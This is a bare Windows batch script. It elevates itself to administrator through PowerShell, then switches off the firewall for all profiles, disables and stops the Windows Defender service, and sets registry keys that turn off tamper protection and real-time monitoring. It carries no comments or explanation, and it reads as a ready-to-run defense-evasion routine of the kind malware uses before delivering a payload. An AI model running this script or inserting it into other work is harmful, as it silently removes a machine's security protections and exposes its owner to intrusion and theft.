@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

NetSh Advfirewall set allprofiles state off
sc config WinDefend start= disabled
sc stop WinDefend
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
